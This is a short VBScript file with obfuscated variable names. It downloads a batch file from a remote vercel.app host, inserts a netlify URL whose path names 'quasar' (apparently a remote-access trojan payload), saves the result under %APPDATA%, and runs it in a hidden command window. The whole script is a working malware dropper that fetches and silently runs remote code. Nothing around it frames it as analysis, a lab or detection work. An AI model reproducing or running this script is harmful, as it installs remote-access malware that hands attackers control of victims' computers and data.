Dim a, b, c, d, e, f, g

Set a = CreateObject("WScript.Shell")

Set b = CreateObject("Scripting.FileSystemObject")

WScript.Sleep 3000

c = a.ExpandEnvironmentStrings("%APPDATA%") & "\x\y"

If b.FolderExists(c) Then b.DeleteFolder c, True

d = Left(c, InStrRev(c, "\") - 1)

If Not b.FolderExists(d) Then b.CreateFolder d

b.CreateFolder c

Set e = CreateObject("MSXML2.ServerXMLHTTP")

e.Open "GET", "https://service-omega-snowy.vercel.app/final.bat", False

e.Send

Set f = CreateObject("ADODB.Stream")

f.Type = 1

f.Open

f.Write e.responseBody

f.Position = 0

f.Type = 2

f.Charset = "utf-8"

g = f.ReadText

g = Replace(g, "****", "https://custom-sites.netlify.app/code/mine/quasar/quasar.txt")

f.Position = 0

f.SetEOS

f.WriteText g

f.SaveToFile c & "\z.txt", 2

If b.FileExists(c & "\z.bat") Then b.DeleteFile c & "\z.bat"

b.MoveFile c & "\z.txt", c & "\z.bat"

a.Run "cmd.exe /c """ & c & "\z.bat""", 0, False

